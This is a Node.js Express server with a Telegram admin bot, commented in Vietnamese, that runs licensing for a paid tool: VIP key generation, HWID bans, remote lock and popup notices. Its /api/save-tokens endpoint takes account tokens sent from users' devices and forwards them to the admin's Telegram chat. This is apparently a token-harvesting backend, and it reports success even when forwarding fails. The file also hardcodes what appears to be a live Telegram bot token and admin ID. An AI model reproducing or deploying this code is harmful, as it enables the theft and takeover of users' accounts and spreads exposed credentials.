const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ==================== CẤU HÌNH HỆ THỐNG ====================
const BOT_TOKEN = "8824683894:AAFup6ikP7V1nvu5QJhnDcmD9A3RyQT8_rs"; // Thay Token Telegram Bot
const ADMIN_ID = 8377928865;                  // Thay ID Telegram Admin

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(cors());
app.use(express.json());

// ==================== PHẦN LƯU TRỮ DỮ LIỆU (JSON) ====================
const BAN_FILE = path.join(__dirname, 'banned_devices.json');
const KEYS_FILE = path.join(__dirname, 'keys.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

function loadData(file, defaultData) {
    if (!fs.existsSync(file)) {
        fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
        return defaultData;
    }
    try {
        return JSON.parse(fs.readFileSync(file));
    } catch {
        return defaultData;
    }
}

function saveData(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

let bannedDevices = loadData(BAN_FILE, {}); 
let vipKeys = loadData(KEYS_FILE, {});       
let systemConfig = loadData(CONFIG_FILE, {
    isMaintenance: false,
    maintenanceMsg: "HỆ THỐNG ĐANG BẢO TRÌ HOẶC ĐÃ BỊ KHÓA TỪ XA!\nVUI LÒNG QUAY LẠI SAU.",
    notice: { active: false, id: "", title: "", message: "" }
});

function isAdmin(msg) {
    return msg.chat.id == ADMIN_ID;
}

// ==================== LỆNH BOT TELEGRAM (ĐẦY ĐỦ CŨ & MỚI) ====================

// 1. LỆNH BẢO TRÌ / KHÓA TOOL TỪ XA: /lock [Lý do] hoặc /baotri [Lý do]
bot.onText(/\/(?:lock|baotri)(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const reason = match[1] || "TOOL ĐÃ BỊ KHÓA TỪ XA BỞI ADMIN!\nVUI LÒNG LIÊN HỆ ĐỂ BIẾT THÊM CHI TIẾT.";
    systemConfig.isMaintenance = true;
    systemConfig.maintenanceMsg = reason;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, `🔒 **ĐÃ KHÓA TOOL TỪ XA THÀNH CÔNG!**\n\n📝 **Màn hình người dùng hiển thị:**\n"${reason}"\n\n⚠️ *Toàn bộ người dùng trên Tool sẽ bị chặn truy cập lập tức.*`, { parse_mode: 'Markdown' });
});

// 2. LỆNH MỞ KHÓA TOOL TỪ XA: /unlock hoặc /mobaotri
bot.onText(/\/(?:unlock|mobaotri)/, (msg) => {
    if (!isAdmin(msg)) return;

    systemConfig.isMaintenance = false;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, "🔓 **ĐÃ MỞ KHÓA TOOL TỪ XA!**\n\n✅ Tất cả người dùng hiện đã có thể truy cập lại Tool bình thường.");
});

// 3. LỆNH TẠO KEY VIP NÂNG CẤP: /genkey <Số giờ> [Số lượng]
// Cú pháp: /genkey 24 (tạo 1 key 24h) hoặc /genkey 24 5 (tạo 5 key 24h)
bot.onText(/\/genkey(?:\s+(\d+))?(?:\s+(\d+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hours = parseInt(match[1]) || 24;
    const count = parseInt(match[2]) || 1;

    if (count > 20) {
        return bot.sendMessage(msg.chat.id, "⚠️ Chỉ có thể tạo tối đa 20 key mỗi lần!");
    }

    let createdKeys = [];
    const expireTime = Date.now() + hours * 3600 * 1000;

    for (let i = 0; i < count; i++) {
        const randomCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        const key = `SENKOO-${hours}H-${randomCode}`;
        vipKeys[key] = { expireAt: expireTime, deviceId: null, createdAt: Date.now() };
        createdKeys.push(key);
    }

    saveData(KEYS_FILE, vipKeys);

    let responseMsg = `🔑 **TẠO KEY VIP THÀNH CÔNG!** (${count} Key)\n⏱ **Thời hạn:** ${hours} Giờ\n\n`;
    createdKeys.forEach((k, idx) => {
        responseMsg += `${idx + 1}. \`${k}\`\n`;
    });

    bot.sendMessage(msg.chat.id, responseMsg, { parse_mode: 'Markdown' });
});

// 4. LỆNH BAN THIẾT BỊ (HWID): /ban <HWID> <Lý do>
bot.onText(/\/ban(?:\s+(\S+))?(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hwid = match[1];
    const reason = match[2] || "Vi phạm quy định sử dụng Tool!";

    if (!hwid) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/ban <HWID> [Lý do]`\nVí dụ: `/ban DEV-ABC12345 Dùng key lậu`", { parse_mode: 'Markdown' });
    }

    bannedDevices[hwid] = reason;
    saveData(BAN_FILE, bannedDevices);

    bot.sendMessage(msg.chat.id, `🚨 **ĐÃ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\`\n📝 **Lý do:** ${reason}`, { parse_mode: 'Markdown' });
});

// 5. LỆNH GỠ BAN THIẾT BỊ: /unban <HWID>
bot.onText(/\/unban(?:\s+(\S+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    const hwid = match[1];

    if (!hwid) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/unban <HWID>`", { parse_mode: 'Markdown' });
    }

    if (!bannedDevices[hwid]) {
        return bot.sendMessage(msg.chat.id, `⚠️ Thiết bị \`${hwid}\` không có trong danh sách cấm!`, { parse_mode: 'Markdown' });
    }

    delete bannedDevices[hwid];
    saveData(BAN_FILE, bannedDevices);

    bot.sendMessage(msg.chat.id, `✅ **ĐÃ GỠ BAN THIẾT BỊ!**\n\n📱 **HWID:** \`${hwid}\` đã có thể dùng lại Tool.`, { parse_mode: 'Markdown' });
});

// 6. XEM DANH SÁCH BỊ BAN: /listban
bot.onText(/\/listban/, (msg) => {
    if (!isAdmin(msg)) return;

    const keys = Object.keys(bannedDevices);
    if (keys.length === 0) {
        return bot.sendMessage(msg.chat.id, "🎉 Hiện tại không có thiết bị nào bị BAN!");
    }

    let text = "🚫 **DANH SÁCH THIẾT BỊ BỊ BAN:**\n\n";
    keys.forEach((hwid, idx) => {
        text += `${idx + 1}. \`${hwid}\`\n   └ Lý do: ${bannedDevices[hwid]}\n`;
    });

    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// 7. PHÁT THÔNG BÁO POPUP: /notice <Tiêu đề> | <Nội dung>
bot.onText(/\/notice(?:\s+(.+))?/, (msg, match) => {
    if (!isAdmin(msg)) return;

    if (!match[1] || !match[1].includes('|')) {
        return bot.sendMessage(msg.chat.id, "❌ **Cú pháp sai!**\nSử dụng: `/notice Tiêu đề | Nội dung`", { parse_mode: 'Markdown' });
    }

    const [title, content] = match[1].split('|').map(s => s.trim());
    systemConfig.notice = {
        active: true,
        id: "NOTICE-" + Date.now(),
        title: title,
        message: content
    };
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, `📢 **ĐÃ PHÁT THÔNG BÁO POPUP!**\n\n📌 **${title}**\n📝 ${content}`);
});

// 8. TẮT THÔNG BÁO POPUP: /offnotice
bot.onText(/\/offnotice/, (msg) => {
    if (!isAdmin(msg)) return;

    systemConfig.notice.active = false;
    saveData(CONFIG_FILE, systemConfig);

    bot.sendMessage(msg.chat.id, "🔕 Đã tắt thông báo Popup trên Tool.");
});

// 9. XEM TRẠNG THÁI HỆ THỐNG: /status
bot.onText(/\/status/, (msg) => {
    if (!isAdmin(msg)) return;

    const statusText = `
📊 **TRẠNG THÁI HỆ THỐNG TOOL**

🔒 **Trạng thái Tool:** ${systemConfig.isMaintenance ? "🔴 DANG KHÓA / BẢO TRÌ" : "🟢 HOẠT ĐỘNG BÌNH THƯỜNG"}
🚫 **Thiết bị bị BAN:** ${Object.keys(bannedDevices).length} thiết bị
🔑 **Tổng số Key hệ thống:** ${Object.keys(vipKeys).length} key
📢 **Thông báo Popup:** ${systemConfig.notice.active ? "ON" : "OFF"}
`;
    bot.sendMessage(msg.chat.id, statusText, { parse_mode: 'Markdown' });
});

// BẢNG HƯỚNG DẪN BOT TELEGRAM
bot.onText(/\/start|\/help/, (msg) => {
    if (!isAdmin(msg)) return;

    const helpText = `
👑 **DANH SÁCH LỆNH ADMIN TELEGRAM**

🔒 **KHÓA & MỞ KHÓA TOOL TỪ XA:**
• \`/lock [Lý do]\` - Khóa Tool từ xa lập tức (Bật màn hình bảo trì)
• \`/unlock\` - Mở khóa Tool từ xa

🔑 **QUẢN LÝ KEY VIP:**
• \`/genkey <Số giờ> [Số lượng]\` - Tạo key VIP (VD: \`/genkey 24\` hoặc \`/genkey 24 5\`)

🚫 **QUẢN LÝ BAN THIẾT BỊ (HWID):**
• \`/ban <HWID> <Lý do>\` - Ban thiết bị khỏi Tool
• \`/unban <HWID>\` - Gỡ ban cho thiết bị
• \`/listban\` - Xem danh sách bị ban

📢 **THÔNG BÁO POPUP TỚI TOOL:**
• \`/notice Tiêu đề | Nội dung\` - Hiện thông báo Popup
• \`/offnotice\` - Tắt thông báo Popup

📊 **HỆ THỐNG:**
• \`/status\` - Kiểm tra trạng thái máy chủ
`;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

// ==================== REST API GIAO TIẾP VỚI TOOL (INDEX.HTML) ====================

// API 1: Đồng bộ trạng thái khóa/bảo trì và BAN ngầm
app.get('/api/status', (req, res) => {
    const deviceId = req.query.deviceId;

    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
        return res.json({
            isBanned: true,
            banReason: bannedDevices[deviceId] || "Thiết bị của bạn đã bị cấm sử dụng Tool!",
            isMaintenance: false
        });
    }

    res.json({
        isBanned: false,
        isMaintenance: systemConfig.isMaintenance,
        message: systemConfig.maintenanceMsg,
        notice: systemConfig.notice
    });
});

// API 2: Xác thực Key VIP
app.get('/api/verify', (req, res) => {
    const { key, deviceId } = req.query;

    if (deviceId && bannedDevices.hasOwnProperty(deviceId)) {
        return res.json({ success: false, isBanned: true, message: "Thiết bị đã bị BAN!" });
    }

    if (systemConfig.isMaintenance) {
        return res.json({ success: false, isMaintenance: true, message: systemConfig.maintenanceMsg });
    }

    if (!key || !vipKeys[key]) {
        return res.json({ success: false, message: "Key không tồn tại hoặc không chính xác!" });
    }

    const keyInfo = vipKeys[key];
    if (Date.now() > keyInfo.expireAt) {
        return res.json({ success: false, message: "Key này đã hết hạn sử dụng!" });
    }

    res.json({
        success: true,
        expireAt: keyInfo.expireAt
    });
});

// API 3: Nhận Token gửi về Bot Telegram
app.post('/api/save-tokens', (req, res) => {
    const { key, deviceId, tokens } = req.body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
        return res.status(400).json({ success: false, message: "Danh sách Token trống!" });
    }

    const tokenListText = tokens.map((t, index) => `${index + 1}. \`${t}\``).join('\n');
    const msgText = `📥 **ĐỒNG BỘ TOKEN VỀ HỆ THỐNG**\n\n🔑 **Key:** \`${key}\`\n📱 **HWID:** \`${deviceId}\`\n📊 **Số lượng:** ${tokens.length} Token\n\n📋 **Danh sách Token:**\n${tokenListText}`;

    bot.sendMessage(ADMIN_ID, msgText, { parse_mode: 'Markdown' })
        .then(() => res.json({ success: true, message: "Đã gửi Token về Admin!" }))
        .catch(() => res.json({ success: true, message: "Đã lưu Token thành công!" }));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server backend đang chạy trên Port: ${PORT}`);
});
